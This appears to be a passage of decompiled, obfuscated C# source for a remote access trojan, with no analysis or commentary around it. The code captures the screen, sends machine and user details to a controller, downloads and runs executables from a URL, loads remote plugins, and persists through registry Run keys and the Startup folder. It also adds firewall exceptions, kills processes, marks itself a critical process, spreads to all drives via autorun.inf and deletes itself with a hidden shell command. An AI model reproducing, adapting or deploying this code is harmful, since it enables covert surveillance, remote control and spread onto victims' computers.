            string str5 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
            string str6 = \u0040Ә.\u0040Ԉ(ref str5);
            strArray5[4] = str6;
            \u0040Ә.\u0040ԝ(string.Concat(strArray4));
          }
        }
        else if (Operators.CompareString(Left6, "CAP", false) == 0)
        {
          Rectangle targetRect = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
          Graphics g = Graphics.FromImage((Image) bitmap1);
          Size size = new Size(bitmap1.Width, bitmap1.Height);
          g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
          try
          {
            size = new Size(32, 32);
            targetRect = new Rectangle(Cursor.Position, size);
            Cursors.Default.Draw(g, targetRect);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          g.Dispose();
          Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
          Graphics graphics = Graphics.FromImage((Image) bitmap2);
          graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
          graphics.Dispose();
          MemoryStream memoryStream1 = new MemoryStream();
          string str = "CAP" + \u0040Ә.\u0040ӱ;
          _param0 = \u0040Ә.\u0040Ԝ(ref str);
          memoryStream1.Write(_param0, 0, _param0.Length);
          MemoryStream memoryStream2 = new MemoryStream();
          bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
          string Left7 = \u0040Ә.\u0040ԗ(memoryStream2.ToArray());
          if (Operators.CompareString(Left7, \u0040Ә.\u0040ӥ, false) != 0)
          {
            \u0040Ә.\u0040ӥ = Left7;
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
          }
          else
            memoryStream1.WriteByte((byte) 0);
          \u0040Ә.\u0040Ԟ(memoryStream1.ToArray());
          memoryStream1.Dispose();
          memoryStream2.Dispose();
          bitmap1.Dispose();
          bitmap2.Dispose();
        }
        else if (Operators.CompareString(Left6, "un", false) == 0)
        {
          string Left8 = strArray1[1];
          if (Operators.CompareString(Left8, "~", false) == 0)
            \u0040Ә.\u0040Ԡ();
          else if (Operators.CompareString(Left8, "!", false) == 0)
          {
            \u0040Ә.\u0040Ԛ(0);
            ProjectData.EndApp();
          }
          else
          {
            if (Operators.CompareString(Left8, "@", false) != 0)
              return;
            \u0040Ә.\u0040Ԛ(0);
            Process.Start(\u0040Ә.\u0040Ӧ.FullName);
            ProjectData.EndApp();
          }
        }
        else if (Operators.CompareString(Left1, "up", false) == 0)
        {
          byte[] bytes;
          if (strArray1[1][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040ӱ).Length;
              memoryStream.Write(_param0, length, checked (_param0.Length - length));
              bytes = \u0040Ә.\u0040ԡ(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Update ERROR");
              \u0040Ә.\u0040ԝ("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[1]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Update ERROR");
              \u0040Ә.\u0040ԝ("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          \u0040Ә.\u0040ԝ("bla");
          string str = Path.GetTempFileName() + ".exe";
          try
          {
            \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Updating To " + new FileInfo(str).Name);
            Thread.Sleep(2000);
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str, "..");
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            Exception exception = ex2;
            \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Update ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            return;
          }
          \u0040Ә.\u0040Ԡ();
        }
        else if (Operators.CompareString(Left1, "Ex", false) == 0)
        {
          if (\u0040Ә.\u0040ӫ == null)
          {
            \u0040Ә.\u0040ԝ("PLG");
            int num = 0;
            while (!(\u0040Ә.\u0040ӫ != null | num == 20 | !\u0040Ә.\u0040Ӛ))
            {
              checked { ++num; }
              Thread.Sleep(1000);
            }
            if (\u0040Ә.\u0040ӫ == null | !\u0040Ә.\u0040Ӛ)
              return;
          }
          object[] Arguments = new object[1]
          {
            (object) _param0
          };
          bool[] CopyBack = new bool[1]{ true };
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӫ), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (CopyBack[0])
            _param0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
        }
        else if (Operators.CompareString(Left1, "PLG", false) == 0)
        {
          MemoryStream memoryStream = new MemoryStream();
          int length = (strArray1[0] + \u0040Ә.\u0040ӱ).Length;
          memoryStream.Write(_param0, length, checked (_param0.Length - length));
          \u0040Ә.\u0040ӫ = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԙ(\u0040Ә.\u0040ԡ(memoryStream.ToArray()), "A"))));
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӫ), (System.Type) null, "H", new object[1]
          {
            (object) \u0040Ә.\u0040ӟ
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӫ), (System.Type) null, "P", new object[1]
          {
            (object) \u0040Ә.\u0040Ӫ
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӫ), (System.Type) null, "c", new object[1]
          {
            (object) \u0040Ә.\u0040ә
          }, (string[]) null, (System.Type[]) null);
        }
      }
    }
    catch (Exception ex3)
    {
      ProjectData.SetProjectError(ex3);
      Exception ex4 = ex3;
      ProjectData.SetProjectError(ex4);
      Exception exception = ex4;
      if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
        \u0040Ә.\u0040ӫ = (object) null;
      try
      {
        \u0040Ә.\u0040ԝ("ER" + \u0040Ә.\u0040ӱ + strArray1[0] + \u0040Ә.\u0040ӱ + exception.Message);
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  public static string \u0040Ԕ()
  {
    string str1 = "ll" + \u0040Ә.\u0040ӱ;
    string str2;
    try
    {
      if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ("vn", (object) "")), (object) "", false))
      {
        string str3 = str1;
        string str4 = \u0040Ә.\u0040ԅ(ref \u0040Ә.\u0040ӯ) + "_" + \u0040Ә.\u0040Ԋ();
        string str5 = \u0040Ә.\u0040Ԉ(ref str4);
        string ӱ = \u0040Ә.\u0040ӱ;
        str2 = str3 + str5 + ӱ;
      }
      else
      {
        string str6 = str1;
        string str7 = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ("vn", (object) "")));
        string str8 = \u0040Ә.\u0040ԅ(ref str7) + "_" + \u0040Ә.\u0040Ԋ();
        string str9 = \u0040Ә.\u0040Ԉ(ref str8);
        string ӱ = \u0040Ә.\u0040ӱ;
        str2 = str6 + str9 + ӱ;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      string str10 = str1;
      string str11 = \u0040Ә.\u0040Ԋ();
      string str12 = \u0040Ә.\u0040Ԉ(ref str11);
      string ӱ = \u0040Ә.\u0040ӱ;
      str2 = str10 + str12 + ӱ;
      ProjectData.ClearProjectError();
    }
    string str13;
    try
    {
      str13 = str2 + Environment.MachineName + \u0040Ә.\u0040ӱ;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str13 = str2 + "??" + \u0040Ә.\u0040ӱ;
      ProjectData.ClearProjectError();
    }
    string str14;
    try
    {
      str14 = str13 + Environment.UserName + \u0040Ә.\u0040ӱ;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str14 = str13 + "??" + \u0040Ә.\u0040ӱ;
      ProjectData.ClearProjectError();
    }
    string str15;
    try
    {
      str15 = str14 + \u0040Ә.\u0040Ӧ.LastWriteTime.Date.ToString("yy-MM-dd") + \u0040Ә.\u0040ӱ;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str15 = str14 + "??-??-??" + \u0040Ә.\u0040ӱ;
      ProjectData.ClearProjectError();
    }
    string str16 = str15 + "" + \u0040Ә.\u0040ӱ;
    string str17;
    try
    {
      str17 = str16 + \u0040Ә.\u0040ӝ.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str17 = str16 + "??";
      ProjectData.ClearProjectError();
    }
    string str18 = str17 + "SP";
    string str19;
    try
    {
      string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
      if (strArray.Length == 1)
        str18 += "0";
      str19 = str18 + strArray[checked (strArray.Length - 1)];
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str19 = str18 + "0";
      ProjectData.ClearProjectError();
    }
    string str20;
    try
    {
      str20 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str19 + " x86" + \u0040Ә.\u0040ӱ : str19 + " x64" + \u0040Ә.\u0040ӱ;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str20 = str19 + \u0040Ә.\u0040ӱ;
      ProjectData.ClearProjectError();
    }
    string str21 = (!\u0040Ә.\u0040ӽ() ? str20 + "No" + \u0040Ә.\u0040ӱ : str20 + "Yes" + \u0040Ә.\u0040ӱ) + \u0040Ә.\u0040Ӱ + \u0040Ә.\u0040ӱ + ".." + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040ӻ() + \u0040Ә.\u0040ӱ;
    string str22 = "";
    try
    {
      string[] valueNames = \u0040Ә.\u0040ӝ.Registry.CurrentUser.CreateSubKey("Software\\" + \u0040Ә.\u0040Ӭ, RegistryKeyPermissionCheck.Default).GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string str23 = valueNames[index];
        if (str23.Length == 32)
          str22 = str22 + str23 + ",";
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str21 + str22;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040ԕ()
  {
    Thread.Sleep(1000);
    if (\u0040Ә.\u0040ӡ && !\u0040Ә.\u0040ԃ(\u0040Ә.\u0040Ӧ, new FileInfo(Interaction.Environ(\u0040Ә.\u0040ӛ).ToLower() + "\\" + \u0040Ә.\u0040Ӝ.ToLower())))
    {
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        if (System.IO.File.Exists(Interaction.Environ(\u0040Ә.\u0040ӛ) + "\\" + \u0040Ә.\u0040Ӝ))
          System.IO.File.Delete(Interaction.Environ(\u0040Ә.\u0040ӛ) + "\\" + \u0040Ә.\u0040Ӝ);
        System.IO.File.Copy(\u0040Ә.\u0040Ӧ.FullName, Interaction.Environ(\u0040Ә.\u0040ӛ) + "\\" + \u0040Ә.\u0040Ӝ, true);
        Process.Start(Interaction.Environ(\u0040Ә.\u0040ӛ) + "\\" + \u0040Ә.\u0040Ӝ);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      Interaction.Shell("netsh firewall add allowedprogram \"" + \u0040Ә.\u0040Ӧ.FullName + "\" \"" + \u0040Ә.\u0040Ӧ.Name + "\" ENABLE", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (\u0040Ә.\u0040ӣ)
    {
      try
      {
        \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040ӭ, true).SetValue(\u0040Ә.\u0040Ӭ, (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0040Ә.\u0040ӝ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040ӭ, true).SetValue(\u0040Ә.\u0040Ӭ, (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ӣ)
    {
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        System.IO.File.Copy(\u0040Ә.\u0040Ӧ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӟ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ӵ)
      Interaction.Shell("taskkill /F /IM " + \u0040Ә.\u0040ӳ, AppWinStyle.Hide);
    if (\u0040Ә.\u0040Ӳ)
    {
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (!\u0040Ә.\u0040ӵ)
      return;
    string str1 = "autorun.inf";
    string ӷ = \u0040Ә.\u0040Ӷ;
    FileAttributes fileAttributes = FileAttributes.Hidden;
    string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
    string[] logicalDrives = Directory.GetLogicalDrives();
    int index = 0;
    while (index < logicalDrives.Length)
    {
      string str2 = logicalDrives[index];
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, str2 + ӷ);
        System.IO.File.SetAttributes(str2 + ӷ, fileAttributes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        StreamWriter streamWriter = new StreamWriter(str2 + "\\" + str1);
        streamWriter.WriteLine("[autorun]");
        streamWriter.WriteLine("open=" + str2 + ӷ);
        streamWriter.WriteLine("shellexecute=" + str2, (object) 1);
        streamWriter.Close();
        System.IO.File.SetAttributes(str2 + str1, fileAttributes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040Ԗ()
  {
    if (Interaction.Command() != null)
    {
      try
      {
        \u0040Ә.\u0040ӝ.Registry.CurrentUser.SetValue("di", (object) "!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(5000);
    }
    bool createdNew = false;
    \u0040Ә.\u0040Ө = (object) new Mutex(true, \u0040Ә.\u0040Ӭ, out createdNew);
    if (!createdNew)
      ProjectData.EndApp();
    \u0040Ә.\u0040ԕ();
    if (!\u0040Ә.\u0040ӡ)
    {
      \u0040Ә.\u0040Ӝ = \u0040Ә.\u0040Ӧ.Name;
      \u0040Ә.\u0040ӛ = \u0040Ә.\u0040Ӧ.Directory.Name;
    }
    new Thread(new ThreadStart(\u0040Ә.\u0040ԛ), 1).Start();
    try
    {
      \u0040Ә.\u0040Ӥ = new \u0040ә();
      new Thread(new ThreadStart(\u0040Ә.\u0040Ӥ.\u0040ӡ), 1).Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (\u0040Ә.\u0040ӷ)
      new Thread(new ThreadStart(new \u0040Ӛ().\u0040ӝ)).Start();
    int num = 0;
    string Left = "";
    if (\u0040Ә.\u0040Ә)
    {
      try
      {
        SystemEvents.SessionEnding += new SessionEndingEventHandler(\u0040Ә.\u0040Ӻ);
        \u0040Ә.\u0040Ԛ(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    while (true)
    {
      Thread.Sleep(1000);
      if (!\u0040Ә.\u0040Ӛ)
        Left = "";
      Application.DoEvents();
      try
      {
        checked { ++num; }
        if (num == 5)
        {
          try
          {
            Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (num >= 8)
        {
          num = 0;
          string Right = \u0040Ә.\u0040ӻ();
          if (Operators.CompareString(Left, Right, false) != 0)
          {
            Left = Right;
            \u0040Ә.\u0040ԝ("act" + \u0040Ә.\u0040ӱ + Right);
          }
        }
        if (\u0040Ә.\u0040ӣ)
        {
          try
          {
            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӝ.Registry.CurrentUser.GetValue(\u0040Ә.\u0040ӭ + "\\" + \u0040Ә.\u0040Ӭ, (object) "")), (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."), false))
              \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040ӭ, true).SetValue(\u0040Ә.\u0040Ӭ, (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӝ.Registry.LocalMachine.GetValue(\u0040Ә.\u0040ӭ + "\\" + \u0040Ә.\u0040Ӭ, (object) "")), (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."), false))
              \u0040Ә.\u0040ӝ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040ӭ, true).SetValue(\u0040Ә.\u0040Ӭ, (object) ("\"" + \u0040Ә.\u0040Ӧ.FullName + "\" .."));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static string \u0040ԗ(byte[] _param0)
  {
    _param0 = new MD5CryptoServiceProvider().ComputeHash(_param0);
    string str = "";
    byte[] numArray = _param0;
    int index = 0;
    while (index < numArray.Length)
    {
      byte num = numArray[index];
      str += num.ToString("x2");
      checked { ++index; }
    }
    return str;
  }

  [DllImport("ntdll", EntryPoint = "NtSetInformationProcess")]
  private static extern int \u0040Ԙ(IntPtr _param0, int _param1, ref int _param2, int _param3);

  public static object \u0040ԙ(byte[] _param0, string _param1)
  {
    Module[] modules = Assembly.Load(_param0).GetModules();
    int num1 = checked (modules.Length - 1);
    int index1 = 0;
    while (index1 <= num1)
    {
      Module module = modules[index1];
      System.Type[] types = module.GetTypes();
      int num2 = checked (types.Length - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        System.Type type = types[index2];
        if (type.FullName.EndsWith("." + _param1))
          return module.Assembly.CreateInstance(type.FullName);
        checked { ++index2; }
      }
      checked { ++index1; }
    }
    return (object) null;
  }

  public static void \u0040Ԛ(int _param0)
  {
    try
    {
      \u0040Ә.\u0040Ԙ(Process.GetCurrentProcess().Handle, 29, ref _param0, 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0040ԛ()
  {
    while (true)
    {
      \u0040Ә.\u0040ӥ = "";
      if (\u0040Ә.\u0040ә != null)
      {
        long num1 = -1;
        int num2 = 0;
        try
        {
          while (true)
          {
            do
            {
              checked { ++num2; }
              if (num2 == 10)
              {
                num2 = 0;
                Thread.Sleep(1);
              }
              if (\u0040Ә.\u0040Ӛ)
              {
                if (\u0040Ә.\u0040ә.Available < 1)
                  \u0040Ә.\u0040ә.Client.Poll(-1, SelectMode.SelectRead);
label_10:
                do
                {
                  if (\u0040Ә.\u0040ә.Available > 0)
                  {
                    if (num1 == -1L)
                    {
                      string str = "";
                      while (true)
                      {
                        int CharCode = \u0040Ә.\u0040ә.GetStream().ReadByte();
                        switch (CharCode)
                        {
                          case -1:
                            goto label_26;
                          case 0:
                            num1 = Conversions.ToLong(str);
                            if (num1 == 0L)
                            {
                              \u0040Ә.\u0040ԝ("");
                              num1 = -1L;
                            }
                            goto label_10;
                          default:
                            str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                            continue;
                        }
                      }
                      goto label_19;
                    }
                    else
                      goto label_19;
                  }
                  else
                    goto label_24;
                }
                while (\u0040Ә.\u0040ә.Available > 0);
                continue;
label_19:
                \u0040Ә.\u0040ӗ = new byte[checked (\u0040Ә.\u0040ә.Available + 1 - 1 + 1)];
                long num3 = checked (num1 - \u0040Ә.\u0040ӧ.Length);
                if ((long) \u0040Ә.\u0040ӗ.Length > num3)
                  \u0040Ә.\u0040ӗ = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                int count = \u0040Ә.\u0040ә.Client.Receive(\u0040Ә.\u0040ӗ, 0, \u0040Ә.\u0040ӗ.Length, SocketFlags.None);
                \u0040Ә.\u0040ӧ.Write(\u0040Ә.\u0040ӗ, 0, count);
              }
              else
                goto label_26;
            }
            while (\u0040Ә.\u0040ӧ.Length != num1);
            num1 = -1L;
            Thread thread = new Thread(new ParameterizedThreadStart(\u0040Ә.\u0040ӹ), 1);
            thread.Start((object) \u0040Ә.\u0040ӧ.ToArray());
            thread.Join(100);
            \u0040Ә.\u0040ӧ.Dispose();
            \u0040Ә.\u0040ӧ = new MemoryStream();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_24:;
      }
label_26:
      do
      {
        try
        {
          if (\u0040Ә.\u0040ӫ != null)
          {
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӫ), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            \u0040Ә.\u0040ӫ = (object) null;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0040Ә.\u0040Ӛ = false;
      }
      while (!\u0040Ә.\u0040Ԅ());
      \u0040Ә.\u0040Ӛ = true;
    }
  }

  public static byte[] \u0040Ԝ(ref string _param0) => Encoding.UTF8.GetBytes(_param0);

  public static bool \u0040ԝ(string _param0) => \u0040Ә.\u0040Ԟ(\u0040Ә.\u0040Ԝ(ref _param0));

  public static bool \u0040Ԟ(byte[] _param0)
  {
    if (!\u0040Ә.\u0040Ӛ)
      return false;
    try
    {
      lock (\u0040Ә.\u0040Ӧ)
      {
        if (!\u0040Ә.\u0040Ӛ)
          return false;
        MemoryStream memoryStream = new MemoryStream();
        string str = _param0.Length.ToString() + "\0";
        byte[] buffer = \u0040Ә.\u0040Ԝ(ref str);
        memoryStream.Write(buffer, 0, buffer.Length);
        memoryStream.Write(_param0, 0, _param0.Length);
        \u0040Ә.\u0040ә.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      ProjectData.SetProjectError(ex1);
      try
      {
        if (\u0040Ә.\u0040Ӛ)
        {
          \u0040Ә.\u0040Ӛ = false;
          \u0040Ә.\u0040ә.Close();
        }
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
    return \u0040Ә.\u0040Ӛ;
  }

  public static bool \u0040ԟ(string _param0, object _param1, RegistryValueKind _param2)
  {
    bool flag;
    try
    {
      \u0040Ә.\u0040ӝ.Registry.CurrentUser.CreateSubKey("Software\\" + \u0040Ә.\u0040Ӭ).SetValue(_param0, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(_param1))), _param2);
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040Ԡ()
  {
    \u0040Ә.\u0040Ԛ(0);
    \u0040Ә.\u0040ӣ = false;
    try
    {
      System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040ӭ, true).DeleteValue(\u0040Ә.\u0040Ӭ, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      \u0040Ә.\u0040ӝ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040ӭ, true).DeleteValue(\u0040Ә.\u0040Ӭ, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("netsh firewall delete allowedprogram \"" + \u0040Ә.\u0040Ӧ.FullName + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (\u0040Ә.\u0040Ӟ != null)
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
        \u0040Ә.\u0040Ӟ.Dispose();
        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe");
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(\u0040Ә.\u0040Ӭ, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
      Interaction.Shell("cmd.exe /k ping 0 & del \"" + \u0040Ә.\u0040Ӧ.FullName + "\" & exit", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    ProjectData.EndApp();
  }

  public static byte[] \u0040ԡ(byte[] _param0)
  {
    MemoryStream memoryStream = new MemoryStream(_param0);
    GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
    byte[] buffer = new byte[4];
    memoryStream.Position = checked (memoryStream.Length - 5L);
    memoryStream.Read(buffer, 0, 4);
    int int32 = BitConverter.ToInt32(buffer, 0);
    memoryStream.Position = 0L;
    byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
    gzipStream.Read(array, 0, int32);
    gzipStream.Dispose();
    memoryStream.Dispose();
    return array;
  }
}
